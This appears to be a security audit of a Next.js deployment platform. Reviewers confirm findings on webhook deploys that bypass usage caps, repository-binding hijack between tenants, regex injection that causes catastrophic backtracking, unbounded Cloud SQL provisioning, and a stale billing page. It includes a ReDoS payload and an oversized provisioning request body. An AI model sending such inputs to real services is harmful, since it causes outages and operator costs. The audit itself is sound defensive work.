**Reviewer correction.** Accurate as reported, with three refinements. (a) The exact line is route.ts:128, not :129 (:129 is `projectId:`). (b) Frame it as a systemic enforcement gap rather than an attacker-only scenario: git-push is the primary deployment mechanism in this product, so checkUsageLimits is bypassed during ordinary operation for essentially all deployments — the manual /deploy button is the minority path. The abuse case (free-tier account pushing commits in a loop) is just the deliberate version of what already happens by default. (c) There is a third uncapped deployment creator besides the two webhook handlers: src/app/api/projects/[id]/deployments/[deployId]/rollback/route.ts:55 also calls createDeployment with no checkUsageLimits, so "caps are only enforced on the manual /deploy route" is literally true but the uncapped surface is three call sites, not two. Impact class is financial/resource abuse (unmetered Cloud Build and Cloud Run at operator cost), not a confidentiality or cross-tenant authorization break — but it is unmitigated: the 30 req/min per-IP webhook rate limit in src/proxy.ts is not a quota control, calculateOverageCharges is never invoked so overage is never billed, and project.buildTimeout has no upper bound, so each uncapped push can be an arbitrarily long build. The same webhook path also bypasses the `access.role === 'viewer'` deployment restriction enforced at deploy/route.ts:43-48, since a viewer with repo write access can trigger deploys by pushing. | Confirmed as described, with severity downgraded to medium. The GitHub-webhook deployment path performs no usage-cap enforcement: handlePushEvent (src/app/api/webhooks/github/route.ts:87-226) and handlePullRequestEvent (same file, 228-623) both run createDeployment -> generateCloudRunDeployConfig -> submitCloudBuild with no call to checkUsageLimits, and no guard exists in any helper on that path, in src/proxy.ts, or as a post-hoc suspension. checkUsageLimits (src/lib/billing/caps.ts:43-47) has exactly one caller, src/app/api/projects/[id]/deploy/route.ts:54. Since createRepoWebhook (src/app/api/projects/route.ts:133) registers push+pull_request hooks on every project at creation, the ungated path is the default deployment trigger and the gated manual route is the exception. Usage is still counted for webhook deploys (getMonthlyUsage counts all deployment docs), so a free-tier account past 20 deployments/mo is blocked from the manual Deploy button while `git push` keeps building forever. Classify as an uncapped-cost / quota-bypass business-logic defect (financial abuse vector on a free tier), not a security boundary breach: no data exposure, no privilege escalation, actor is the project owner, and every over-limit deployment is recorded in the audit log and usage counters. Fix: extract the gate into a shared helper and call it in both webhook handlers before createDeployment, keyed on project.userId (note session.user.id is unavailable here), returning early and marking the deployment 'error' / 'skipped-quota' rather than submitting the build.

**Verified code:**

```ts
src/app/api/webhooks/github/route.ts:127-137 (handlePushEvent, no cap check before it):
  127	    // Create deployment record
  128	    const deployment = await createDeployment({
  129	        projectId: project.id,
  130	        type: deploymentType,
  131	        status: 'queued',
  132	        gitBranch: branch,
  133	        gitCommitSha: head_commit.id,
  134	        gitCommitMessage: head_commit.message,
  135	        gitCommitAuthor: head_commit.author.username || head_commit.author.name,
  136	    });
(note: :128 is the createDeployment call; the finder cited :129, one line off — immaterial)

src/app/api/webhooks/github/route.ts:176 (same function, real build submitted):
        const { buildId, logUrl } = await submitCloudBuild(buildConfig, project.region);

src/app/api/webhooks/github/route.ts:517-526 + 587 (PR path, identical gap):
        const deployment = await createDeployment({
            projectId: project.id,
            type: 'preview',
            ...
            pullRequestNumber: pull_request.number,
        });
        ...
            const { buildId, logUrl 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** CONFIRMED — the claim is accurate on mechanism, location, and reachability. I read the webhook route, the two cap modules, the manual deploy route, the signature verifier, the proxy rate limiter, and the webhook-registration call site.

1. Location is exact. src/app/api/webhooks/github/route.ts:129 is `const deployment = await createDeployment({` inside handlePushEvent. From there the function goes straight to getEnvVarsForDeployment -> generateCloudRunDeployConfig -> submitCloudBuild(buildConfig, project.region) -> pollBuildStatus. There is no cap call anywhere in the 623-line file (no import of @/lib/billing/* at all — the import block at lines 1-27 contains none).

2. The finder's grep result reproduces. Repo-wide, the only consumers of cap logic outside src/lib/billing are:
   - src/app/api/projects/[id]/deploy/route.ts:5,54 — the only place that BLOCKS.
   - src/app/api/billing/usage/route.ts:5,29 — calculateTierLimits, display only.
   The second `checkUsageLimits` exported from tiers.ts:101 (pure tier/metric/currentUsage helper) has zero call sites in src/.

3. Reachability by an ordinary unprivileged tenant is real, not theoretical. POST /api/projects:133 calls createRepoWebhook(session.accessToken, owner, repo), which registers a GitHub hook on the tenant's own repo pointing at `${config.appUrl}/api/webhooks/github` with `secret: config.github.webhookSecret` and `events: ['push','pull_request']` (src/lib/github.ts:141-151). So the tenant never forges anything — GitHub itself signs the delivery, and verifyGitHubWebhookSignature (src/lib/security/index.ts:54-75) passes. src/proxy.ts:150 explicitly exempts `/api/webhooks/github` from the auth check. shouldAutoDeploy (src/lib/utils.ts:110-117) returns true unconditionally for the default branch. Nothing here depends on NODE_ENV, MOCK_DB, or admin privilege.

4. The build is real in production. submitCloudBuild (src/lib/gcp/cloudbuild.ts:544-571) POSTs to the live Cloud Build API; the webhook path calls it directly, with no isRunningOnGCP/simulateDeployment guard (unlike the manual route, which imports isRunningOnGCP).

5. Compensating controls I looked for and did not find:
   - Rate limiting: src/proxy.ts:45-48,121 gives /api/webhooks/ 30 req/min per IP+path. That throttles nothing meaningful — deliveries come from GitHub's IP pool, and a push cadence is far under it. It is not a quota control.
   - Overage billing to recoup the cost: calculateOverageCharges (src/lib/billing/pricing.ts:12) has ZERO call sites in src/. Nothing ever charges for exceeding free-tier limits, so the cap gat

</details>

### 🟠 HIGH — Repo-to-project binding is by non-unique repoFullName resolved with limit(1), and project creation only requires read access to the repo
`injection-db-5` · `src/lib/db.ts:1039`

**Failure scenario.** Attacker POSTs /api/projects {repoFullName:'victim-org/public-app'}. getRepo is octokit repos.get (src/lib/github.ts:88), which succeeds for any public repo with any GitHub token — there is no ownership/admin assertion. createRepoWebhook then fails with 404/403 and the failure is swallowed, so the project is created anyway. Nothing enforces uniqueness on repoFullName (no such index or pre-check exists in createProject, src/lib/db.ts:978-999). Now two project documents share repoFullName='victim-org/public-app'. Both webhook handlers resolve the project with getProjectByRepoFullName(repository.full_name) (route.ts:92 and :232), and a Firestore equality query with no orderBy returns results or

**Impact.** Silent takeover of another tenant's CD pipeline for any public repo: victim's deployments stop with no error (handlePushEvent just returns), the attacker receives their commits' build output and controls the served revision, and PR-closed events let the attacker's storageConfigs drive deleteService/deleteSqlDatabase/dropDatabase against attacker-chosen resources on victim-triggered events.

**Reviewer correction.** Accurate restatement: POST /api/projects lets any authenticated user bind a project to any repoFullName they can merely READ (src/app/api/projects/route.ts:116 getRepo → octokit.repos.get, no admin/ownership bit; webhook-creation failure swallowed at lines 132-137), and src/lib/db.ts:1039-1045 resolves inbound webhooks to a single project by non-unique repoFullName with limit(1). The consequence is a one-directional squat/shadow: the attacker cannot inject code into the victim's project (HMAC verification at src/lib/security/index.ts:54-73 blocks forged deliveries, and PATCH's allowlist at src/app/api/projects/[id]/route.ts:126-143 excludes repoFullName), but the victim's own genuine push/PR deliveries can be consumed by the attacker's shadow project instead — silently killing the victim's auto-deploys and exposing commit metadata to a stranger. Winning the race requires the attacker's Firestore doc id to sort below the victim's (default __name__ ordering over random ids from generateId, src/lib/utils.ts:20-24), which is grindable rather than guaranteed. No cross-tenant secret or private source disclosure results, so this is a tenant-isolation / availability-integrity defect at medium, not high. Correct fix is a repo-admin assertion (or requiring successful webhook creation) at bind time plus a uniqueness guard on repoFullName and binding by immutable GitHub repo id rather than by mutable full name. | Directionally correct and reachable; two refinements to the mechanism, and one narrowing of impact.

Refinement 1 — the winner is deterministic and attacker-controllable, which the finder understated. A Firestore equality query with no orderBy is implicitly ordered by __name__ ascending, so limit(1) always returns the lexicographically lowest project document ID. IDs are `'proj_' + Math.random().toString(36)` (db.ts:982, utils.ts:20-24), so an attacker grinds a low-sorting ID in roughly ten POSTs (IP limit is 100/min in src/proxy.ts; there is no project quota) and reliably steals the binding from an already-existing victim project. It is not a race that only the first registrant wins.

Refinement 2 — the amplifier is slug collision. Because slug uniqueness is only checked per-user (`getProjectBySlug(session.user.id, slug)`, route.ts:123) while deploy targets are the global `dfy-<slug>` (getProjectSlugForDeployment, utils.ts:76-91), the attacker can make their hijacking project's slug equal the victim's. The victim's own push then builds under attacker-controlled buildCommand/installCommand/rootDirectory/env vars and deploys onto the victim's Cloud Run service; a `pull_request: closed` on the victim's repo hits `deleteService(getPreviewServiceName(project.slug, pr))` and deletes the victim's preview service.

Narrowing — no confidentiality impact from this path. The attacker can only bind repos their own token can already read (`repos.get`), and the hijacked build runs with the attacker's own env vars and their own encrypted githubToken, so no victim secret or unreadable source is disclosed. The real damage is cross-tenant integrity and availability: the victim's auto-deploys silently stop, and their pushes are built/deployed under attacker-controlled configuration.

Accurate restatement: any self-registered tenant can bind a project to any repository they can merely read, because /api/projects performs no ownership or admin assertion (getRepo drops GitHub's `permissions`) and swallows the createRepoWebhook 403/404. Nothing enforces repoFullName uniqueness, and the webhook handler resolves the delivering repository to a project by repoFullName alone with limit(1) and no userId/teamId predicate and no owner correlation — so a grindable low-sorting document ID lets an attacker capture another tenant's genuinely-signed push and pull_request deliveries.

**Verified code:**

```ts
src/lib/db.ts:1039-1045
    export async function getProjectByRepoFullName(repoFullName: string): Promise<Project | null> {
        const db = getDb();
        const snapshot = await db
            .collection(Collections.PROJECTS)
            .where('repoFullName', '==', repoFullName)
            .limit(1)
            .get();

src/lib/db.ts:978-998 (createProject — no uniqueness check, random id)
    const id = generateId('proj');
    ...
    await db.collection(Collections.PROJECTS).doc(id).set(cleanFirestoreData(project));

src/lib/utils.ts:20-24
    export function generateId(prefix?: string): string {
        const id = Math.random().toString(36).substring(2, 15) +
            Math.random().toString(36).substring(2, 15);
        return prefix ? `${prefix}_${id}` : id;
    }

src/app/api/projects/route.ts:112-137 (only guards are session, team membership, per-user slug collision)
    // Parse repo owner and name
    const { owner, repo } = parseRepoFullName(repoFullName);
    // Get repo details from GitHub
    const repoData = await getRepo(session.accessToken, owner, repo);
   
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted for a mitigation the finder missed and found none that blocks the core defect, though three partial guards exist that change the exploit shape and cap the impact below the claimed "high".

WHAT I VERIFIED AS TRUE:
1. src/lib/db.ts:1039-1045 — getProjectByRepoFullName is a bare equality query on repoFullName with limit(1); no userId/teamId predicate, no orderBy, and no uniqueness enforcement anywhere. I grepped every repoFullName reference in the repo: db.ts has only this one query, and firestore.indexes.json contains no repoFullName entry (and Firestore has no unique-constraint mechanism anyway — createProject at src/lib/db.ts:978-999 is a plain doc().set() with a random id from generateId, src/lib/utils.ts:20-24).
2. src/app/api/projects/route.ts POST — the only authorization checks are getSession() (any signed-in user), getTeamMembership/viewer-role when teamId is supplied (lines 89-106), and a per-user slug-collision check (line 123). There is no repo ownership/admin assertion. getRepo (src/lib/github.ts:88-112) is a plain octokit.repos.get with the user's OAuth token, and the GitHubRepo type (src/types/index.ts:266-277) does not even carry a `permissions` field, so no admin bit is available to check.
3. The webhook-creation failure is swallowed with an explicit comment acknowledging non-admin users (route.ts:131-137), so the project is created regardless.
4. src/app/api/webhooks/github/route.ts:92 and :232 route real push/PR deliveries to whichever single project that limit(1) returns.
5. I searched for the mitigations one would expect and they do not exist: no "repo already connected" check (grep found only a CLI help string), no stored webhook id per project (grep webhookId/hook_id hits only github.ts:170's parameter), no per-project webhook secret (createRepoWebhook uses the single global config.github.webhookSecret, src/lib/github.ts:142-147), no ownership check in src/lib/github/validator.ts (it only inspects file names, and POST /api/projects does not even call it), and src/proxy.ts adds only rate limiting/subdomain rewriting.

GUARDS THAT DO EXIST (they narrow, not refute):
- verifyGitHubWebhookSignature (src/lib/security/index.ts:54-73, HMAC-SHA256 + timingSafeEqual) means the attacker cannot forge a delivery; they must wait for the victim's genuine push. So the attacker cannot push their own code into a victim's project — the flow only goes the other way.
- PATCH /api/projects/[id] has an allowedFields allowlist (route.ts:126-143) that excludes repoFullName, so post-creation rebinding is blocked; the hole is creation-o

</details>

### 🟠 HIGH — Attacker-controlled object keys are interpolated raw into `new RegExp` in the Data Lab query route, giving full regex injection and catastrophic backtracking
`input-validation-dos-2` · `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:101`

**Failure scenario.** `variables` comes straight from `await request.json()` with no type or key-shape validation, and its KEYS are concatenated into a regex source. A user with any project + any storage config whose type contains 'sql' POSTs:
{"query":"SELECT ':aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX'","variables":{"(a+)+b":1}}
Line 101 builds /:(a+)+b\b/g and line 102 runs it against the 40-'a' subject. The nested quantifier has no matching 'b', so the engine explores ~2^40 partitions — the Node event loop is pinned for hours on a single request. This runs at line 94-131, BEFORE the read-only keyword check (line 135) and before any DB connection, so no valid credentials or reachable database are needed. Node 

**Impact.** Any authenticated user can permanently wedge a shared Cloud Run instance's event loop with one small request, denying service to every other tenant on that instance. Also a general regex-injection primitive over the query text.

**Reviewer correction.** Mechanism and severity are right; the scope is narrower than reality on two axes.

(a) The claim's precondition "storage config whose type contains 'sql'" is unnecessary. There are THREE unescaped interpolation sites, covering every storage type: line 101 (Postgres branch), line 116 `new RegExp(\`:(${sortedNames.join('|')})\\b\`, 'g')` (MySQL/PlanetScale branch, where keys are also joined by an unescaped `|`), and line 129 (the NoSQL/Redis else-branch). Any storage connector at all reaches one of them, and the connector's `type` is an unvalidated free-form string the attacker sets when creating it.

(b) There is a partially-unauthenticated variant. On the `widgetId` path (lines 35-59) no session is required, and only `query` is overwritten from the saved widget (`query = widgetData.query`, line 50) — `variables` is still taken raw from the attacker's body at line 28 and still reaches line 101/116/129. The attacker therefore controls the regex source without any credentials. Exploitation there is conditional rather than guaranteed: the ReDoS target string is the widget's own saved query, so it only detonates if that saved query contains a `:` followed by a suitably repetitive run. Worth noting as an unauthenticated reachability path, not as the primary vector.

Impact is a full-instance denial of service, not merely a slow request: no `export const runtime` is declared, so this runs on the Node.js runtime and the synchronous regex blocks the shared event loop for every other tenant on that Cloud Run instance. The 25s `timeoutPromise` at line 197 cannot help — it is (i) declared after the block and (ii) a timer, which cannot preempt synchronous regex execution. Measured extrapolation for the claim's 40-'a' payload: roughly 78 minutes of blocked loop per request, with the proxy still permitting 100 such requests per minute. | Directionally correct and reachable, but restate the impact precisely: this is a pre-authorization-of-content ReDoS / event-loop denial of service, not an injection that reaches the database. Accurate statement: "In POST /api/projects/[id]/storage/[storageId]/query, keys of the unvalidated `variables` object from the request body are interpolated raw into `new RegExp` at lines 101, 116 and 129 and immediately executed against the equally attacker-controlled `query`. Any signed-up tenant — owner of their own project per src/middleware/rbac.ts, with a storage config they can self-create in one call because POST /api/projects/[id]/storage accepts an arbitrary `type` string with `provision:false` and no connection string — can send a key such as `(a+)+b` with a query containing a run of ~35-40 'a' characters and pin the Node event loop for hours. Measured: 32 a's = 92.5 seconds of synchronous CPU, doubling per added character. The block executes before the read-only SQL filter (line 136), before the connection-string check (line 190), and before the 25s timeout is even created (line 197); the timeout could not fire in any case because the regex is synchronous. On Cloud Run this wedges the entire instance for all co-tenant traffic. The regex injection does NOT yield SQL injection — the read-only filter still runs on the rewritten query and the Postgres path remains parameterized. Two secondary notes: the anonymous public-widget path (widgetId) is a far weaker variant because line 50 overwrites `query` with the stored widget query, so the attacker does not control the subject string; and line 110's replacement string `$${idx+1}` is itself interpreted as a capture-group backreference when the attacker's key contains a group, desyncing placeholders from `sqlParams` (a correctness bug, not an escalation). Fix: validate `variables` is a plain object and reject keys not matching /^[A-Za-z_][A-Za-z0-9_]{0,63}$/ before any regex is built."

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/query/route.ts

  26:        const body = await request.json();
  27:        let { query } = body;
  28:        const { variables = {}, widgetId } = body;

  70:                access = await checkProjectAccess(session.user.id, id);
  71:                if (!access.allowed) {
  72:                    return NextResponse.json({ success: false, error: access.error }, { status: access.status });
  73:                }

  91:        if (Object.keys(variables).length > 0 && query !== 'DISCOVER_SCHEMA') {
  94:                const varNames = Object.keys(variables);
  95:                const sortedNames = [...varNames].sort((a, b) => b.length - a.length);
  97:                if (isPostgres) {
 100:                    for (const name of sortedNames) {
 101:                        const regex = new RegExp(`:${name}\\b`, 'g');
 102:                        if (regex.test(query)) {
 110:                            query = query.replace(regex, `$${idx + 1}`);

 113:                } else {
 116:                    const pattern = new RegExp(`:(${so
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the whole handler, src/proxy.ts, src/middleware/rbac.ts, the storage-create route, and the route's own test file, specifically hunting for a guard the finder missed. Every candidate mitigation fails:

1. No escaping helper exists. `grep -rn "escapeRegExp|escapeRegex|escapeStringRegexp" src/` returns nothing, and a repo-wide grep for the standard metachar-escape idiom returns nothing.

2. No schema validation layer. package.json has no zod/joi/yup/ajv/superstruct. `variables` is destructured raw from `await request.json()` (line 28) and its only uses are `Object.keys(variables)` (91, 94, 125) and index lookups (107, 118, 127). Nothing constrains key shape.

3. The read-only SQL allowlist is NOT a gate — it runs at line 136, thirty-five lines AFTER the regex is built and executed at 101-102. The event loop is already wedged before any query-shape check.

4. Auth is not a meaningful barrier. The standard path requires only `getSession()` plus `checkProjectAccess(...).allowed` (lines 62-74); rbac.ts returns `allowed: true` for ANY role including `viewer` (src/middleware/rbac.ts:20,25). On a self-serve PaaS, an attacker creates their own project and is `owner`. The storage-create route (src/app/api/projects/[id]/storage/route.ts:88) only requires `type && name` — `type` is an unvalidated free-form string, and no DB connectivity is needed because the regex runs at line 101, long before `getSecretValue`/connection at line 186.

5. Rate limiting does not mitigate. src/proxy.ts:122-124 allows 100 req/min per IP+path for non-strict routes (this route is non-strict). A single request suffices — see the measurement below.

6. No runtime isolation. The route declares no `export const runtime`, so it runs on the default Node.js runtime: one blocked event loop stalls every concurrent request on that Cloud Run instance, not just the attacker's.

7. The existing test pins nothing. route.test.ts:31 is the only `variables` usage; it passes a benign `{ id: 1 }` and both tests wrap `POST` in try/catch that swallows every error.

I empirically confirmed the exponential blowup with the exact code from lines 101-102 (18a=6.9ms, 22a=19ms, 24a=72ms, 26a=289ms, 28a=1152ms — clean 2x per added character). Extrapolating the claim's 40-'a' payload gives ~2^12 x 1152ms ≈ 78 minutes of fully blocked event loop from one HTTP request.

The finder's mechanism is correct. Two things are understated, so I set refuted=false with a correction rather than a clean confirm.

**[upholds]** I read the whole route, its RBAC helper, the storage-config creation route, and src/pro

</details>

### 🟠 HIGH — Cloud SQL machine `tier` and HA flag are taken unvalidated from the request body and there is no provisioning quota anywhere
`input-validation-dos-4` · `src/app/api/projects/[id]/storage/route.ts:120` · reported by 2 independent dimensions

**Failure scenario.** Any signed-up user creates a project (they are owner, so `checkProjectAccess` passes and `access.role !== 'viewer'`) and POSTs to /api/projects/{id}/storage with `{"type":"cloud-sql-postgres","name":"a1","provision":true,"region":"us-central1","metadata":{"tier":"db-custom-96-624000","highAvailability":true,"pitrEnabled":true}}`. `metadata.tier` is never checked against an allowlist and flows into the Cloud SQL Admin API call at cloudsql.ts:51 using Deployify's own service-account token (`getGcpAccessToken()`), creating a 96-vCPU / 624GB regional HA instance in the PLATFORM's GCP project — roughly USD 10k+/month per instance. `region` is equally unvalidated. Nothing rate-limits or caps this:

**Impact.** Unbounded financial denial of service: a free-tier account can provision arbitrarily large GCP resources billed to the platform, and can exhaust the platform GCP project's Cloud SQL instance quota so no legitimate tenant can provision.

**Reviewer correction.** The claim is correct as stated; I am sharpening it rather than downgrading it. Three refinements:

(1) The precise defect is a CLIENT-SIDE-ONLY ALLOWLIST, not a merely absent one. A tier enum does exist — as HTML `<option>` values in src/components/StorageSection.tsx (capped at db-custom-8-30720) — but no server code reads it, and the repo carries no validation library (zero `zod` hits). This makes the finding stronger, not weaker: the control was designed and then implemented only in the browser.

(2) The quota gap is worse than "no quota exists". src/lib/billing/tiers.ts:33 declares `free.limits.projects = 3`, but `limits.projects` has zero references anywhere in src/. The one enforcement helper that is wired up, `checkUsageLimits` from @/lib/billing/caps, is imported by a single route (deploy) and measures only deployments/buildMinutes/bandwidth — it never looks at provisioned infrastructure. So the platform believes it has plan limits and does not enforce them.

(3) There is a second, independent sink the claim did not cite: POST /api/projects/[id]/storage/[storageId]/replica takes `body.tier` straight into `createReadReplica(...)` at src/app/api/projects/[id]/storage/[storageId]/replica/route.ts:58-61, gated only on `role === 'owner' || 'admin'` — which the attacker satisfies on their own project. A fix that only validates the POST /storage path leaves this open.

Severity stays high. The actor is the lowest-privileged one that matters (any GitHub account, open OAuth, no invite gate), the resources are billed to the operator's own GCP project via the platform service account, `availabilityType: REGIONAL` doubles the spend, the 100 req/min proxy limit permits bulk creation rather than preventing it, and exhausting shared regional Cloud SQL quota degrades provisioning for every other tenant. The only ceilings are external GCP quotas and operator billing alerts, neither of which is a code-level control. | Directionally correct and the mechanism holds; three refinements. (1) It is not an input-*validation*/injection issue — the tier string is placed in a JSON body sent to the Cloud SQL Admin API, so there is no injection; it is unbounded resource authorization: no allowlist on `metadata.tier`, no bound on `highAvailability`, and no cap on the number of provisioned instances. (2) The same hole exists in PATCH on the same file (lines 411-422 → cloudsql.ts:466-469), so an already-created instance can be resized to any tier afterwards; the fix must cover both verbs. (3) One partial control the finder missed, which does not neutralize it: src/proxy.ts rate-limits `/api/*` to 100 req/min per `${ip}:${pathname}` — that bounds request rate but not instance size, count or spend, and the counter is a per-process in-memory Map keyed off client-supplied x-forwarded-for. Materially aggravating and worth adding: all tenants' instances are created in one operator-owned GCP project (`config.gcp.projectId` from a single `GCP_PROJECT_ID` env var), so the cost lands on the platform and exhausting that project's Cloud SQL instance/CPU quota denies provisioning to every other tenant — a cross-tenant availability impact, not just a bill. Mitigating only in that `deletionProtectionEnabled` defaults to false and each provision is audit-logged (`storage.created` with the user id), so detection and teardown are fast. Severity high is correct.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/route.ts:75-81 (the only authz gate + fully body-controlled inputs)
    75:        if (access.role === 'viewer') {
    76:            return NextResponse.json({ error: 'Forbidden: Viewers cannot manage storage' }, { status: 403 });
    77:        }
    ...
    81:        const { type, name, environment = 'both', connectionString, envKey, branchingSettings, autoMigration, migrationCommand, provision = false, region, providerApiKey, dbPassword, providerProjectId, autoMaintenanceWindow } = body;
    82:        let metadata = body.metadata;

src/app/api/projects/[id]/storage/route.ts:103-129 (the cited sink; note line 120 and its mysql twin at 127)
   103:        if (provision) {
   104:            const targetRegion = region || project.region || 'us-central1';
   ...
   116:                if (type === 'cloud-sql-postgres' && resourceName) {
   117:                    provisionResult = await createCloudSqlInstance(resourceName, 'postgres', targetRegion, {
   118:                        highAvailability: metadata?.highAvailability,
   119:               
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I traced the full path and could not refute it.

REACHABILITY (production, MOCK_DB unset):
1. Signup is open. src/app/api/auth/callback/route.ts has no allowlist, invite check, or org gate — any GitHub account reaches `upsertUser(...)` then `createSessionToken(user, accessToken)` and gets the `deployify_session` cookie.
2. getSession() (src/lib/auth.ts:88-106) only falls back to MOCK_SESSION when `NODE_ENV === 'development' || MOCK_DB === 'true'`, so in production it is a genuine JWT verification — reachable by a real signed-up tenant, not a dev bypass.
3. Project creation is unrestricted: POST /api/projects (src/app/api/projects/route.ts:58+) goes straight to `createProject({ userId: session.user.id, teamId: teamId || undefined, ... })` with no count check. `createProject` in src/lib/db.ts:978-999 is a bare Firestore `.set()`.
4. checkProjectAccess (src/middleware/rbac.ts:22-26) returns `{allowed: true, project, role: 'owner'}` for a personal project the caller owns, so the only gate in the POST handler — `if (access.role === 'viewer')` at line 75 — does not fire.
5. `provision` is body-controlled (`provision = false` destructured at line 81), so the attacker flips it on and enters the block at line 103.
6. `metadata.tier` / `metadata.highAvailability` flow verbatim into GCP: route line 117-121 -> src/lib/gcp/cloudsql.ts:51-52 emits `settings.tier = options.tier || 'db-f1-micro'` and `availabilityType = options.highAvailability ? 'REGIONAL' : 'ZONAL'` in the sqladmin POST body. The `|| 'db-f1-micro'` default only applies when the value is falsy; any non-empty string is forwarded untouched.

THE ALLOWLIST IS CLIENT-SIDE ONLY. There IS a tier enum in this codebase, but it lives exclusively in React `<option>` values (src/components/StorageSection.tsx:2370-2374, 2468-2507, 3803-3805 — topping out at db-custom-8-30720). Nothing server-side reads it. The repo has no `zod` dependency and no validation schema anywhere (`grep "from 'zod'"` = 0 hits).

NO QUOTA — verified independently, not taken on faith. `src/lib/billing/tiers.ts` defines `free.limits.projects = 3`, but `grep -rn "limits\.projects"` across src/ returns zero hits. `calculateTierLimits` is imported only by the read-only display route src/app/api/billing/usage/route.ts:29. `checkUsageLimits` from `@/lib/billing/caps` is imported by exactly one route (src/app/api/projects/[id]/deploy/route.ts:5) and it only measures deployments/buildMinutes/bandwidth — nothing about storage provisioning. No storage-count, instance-count, or spend cap exists anywhere.

RATE LIMITING DOES NOT MITIGATE 

</details>

### 🟠 HIGH — After a successful payment the billing page never refetches, so the customer's plan badge and quota gauges keep showing the tier they just paid to leave
`product-ux-5` · `src/app/billing/page.tsx:148`

**Failure scenario.** A Free-plan user clicks "Upgrade to Pro", completes the ₹1,500 Razorpay payment, and /api/billing/verify returns 200. They see "Payment Successful & Verified! Upgrading your plan...". Then: the "Current Plan" badge still reads FREE, the Pro card still says "Upgrade to Pro" (and is still clickable — a second ₹1,500 charge is one click away), the Free card is still ring-highlighted as current, and the usage gauges still show 20 deployments / 100 build minutes / 5 GB. router.refresh() re-renders the RSC tree, but no server component supplies any of this — the zustand store is untouched. Nothing changes until the user does a full page reload.

**Impact.** The moment immediately after taking a customer's money is the moment the product looks most broken. The user reasonably concludes the payment did not apply; the still-enabled "Upgrade to Pro" button invites a duplicate charge, and the alternative is a refund request. Also silently applies to the invoice table, which stays empty right after the purchase.

**Reviewer correction.** The mechanism is confirmed exactly as described — `router.refresh()` at src/app/billing/page.tsx:153 cannot re-run the client-only `useEffect` (its dep `fetchBillingData` is a stable Zustand module-singleton action), the page is 100% client-rendered, and no poll, socket, webhook push, or focus handler ever rewrites `usageData`. So the plan badge (page.tsx:252), the usage gauges, the ComparePlansTable, and PricingCard's `currentPlanId` (page.tsx:316) all keep rendering the pre-payment tier, and the "Upgrade to Pro" button stays enabled and clickable — with no already-on-tier or idempotency guard in src/app/api/billing/checkout/route.ts, a second ₹1,500 order really can be created.

What the finder got wrong is the impact. The payment is not at risk: src/app/api/billing/verify/route.ts awaits `updateUser(...)` and re-mints the session cookie before returning 200, and src/app/api/billing/usage/route.ts derives the tier from `getUserById` on every call — so the customer's entitlement and server-side quota enforcement are correct the instant verify returns. Only the already-rendered view is stale, and it self-heals on any full reload or on client-side navigation away and back (which unmounts BillingPage and re-runs the effect). The residual real risk is a user who reads the stale FREE badge and maxed-out gauges as a failed payment and deliberately clicks through a second Razorpay modal. That is a genuine billing-integrity gap worth fixing (call `fetchBillingData()` instead of / alongside `router.refresh()`, and reject checkout when the user is already on the requested tier), but it is user-visible and self-initiated, not silent data loss or an automatic double charge. | Directionally and mechanically correct; only the line number is off. The defect is src/app/billing/page.tsx:153 — `router.refresh()` where `await fetchBillingData()` is needed — not :148, which is just the response parse. `router.refresh()` cannot help here because the billing page is a client component under a static server root layout with no route-level layout/template, so the RSC merge preserves the module-level zustand store and the mount-only effect at page.tsx:97-98 never re-runs. Worth adding to the finding: the duplicate-charge consequence is not merely a UI slip, because /api/billing/checkout has no same-tier idempotency guard — it never compares tierId against the user's existing subscription — so the second click produces a real second Razorpay order. Also note the invoices table is populated by the same never-repeated fetch, so the customer sees no new invoice either, and /api/billing/verify writes no invoice record at all, giving zero in-app confirmation of the payment. Severity high stands: money changes hands, every visible indicator contradicts it, and the only recovery is the customer independently deciding to hard-reload. Fix is one line: replace `router.refresh()` with `await fetchBillingData()` (keeping `router.refresh()` is harmless but insufficient), and add a same-tier rejection in the checkout route.

**Verified code:**

```ts
src/app/billing/page.tsx:1
    'use client';

src/app/billing/page.tsx:96-98
        useEffect(() => {
            fetchBillingData();
        }, [fetchBillingData]);

src/app/billing/page.tsx:148-156  (the claimed location)
                            const verifyData = await verifyRes.json();

                            if (verifyRes.ok) {
                                toast.success('Payment Successful & Verified! Upgrading your plan...');
                                setUpgradingTierId(null);
                                router.refresh();
                            } else {
                                throw new Error(verifyData.error || 'Payment verification failed');
                            }

src/app/billing/page.tsx:210  (everything rendered derives from the stale store value)
        const { usage, limits, tier } = usageData;

src/app/billing/page.tsx:252
        <Badge variant="default" className="...">{tier.name.toUpperCase()}</Badge>

src/app/billing/page.tsx:313-320
                        <PricingCard
                            key={plan.id}
           
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted for a mitigation and found none.

1. The refresh call is real and is a no-op for this page's data. src/app/billing/page.tsx:153 calls `router.refresh()`. The entire page is `'use client'` (line 1) and holds zero server-fetched data — every value rendered (`tier`, `usage`, `limits`, `invoices`) comes from the Zustand store, populated only by the client-side `fetch('/api/billing/usage')` in `fetchBillingData`. Next's `router.refresh()` re-fetches the RSC payload and merges it "without losing client-side React state"; the client component's element type is stable across payloads, so React reuses the mounted instance rather than remounting it. Nothing in that path re-invokes a client `useEffect` or touches the Zustand store.

2. The one effect that loads data cannot re-run. `useEffect(() => { fetchBillingData(); }, [fetchBillingData])` (page.tsx:96-98). `fetchBillingData` is created once inside `createBillingSlice` (billing-slice.ts:56) and the store is a module-level singleton (`export const useStore = create(...)` in src/store/index.ts), so the dependency identity never changes. The effect fires exactly once per mount.

3. No alternative refresh channel exists. `grep -rn "fetchBillingData|usageData|billing/usage" src --include='*.ts' --include='*.tsx'` returns hits only in page.tsx and billing-slice.ts. `grep -rn "router.refresh" src` returns exactly one hit — line 153. `grep -rn "EventSource|WebSocket|onSnapshot|setInterval" src/app/billing src/store src/components/billing` returns nothing. There is a src/app/api/billing/webhook/route.ts, but it is server-side only with no push channel to the browser. No focus/visibility refetch, no poll, no persist/rehydrate middleware.

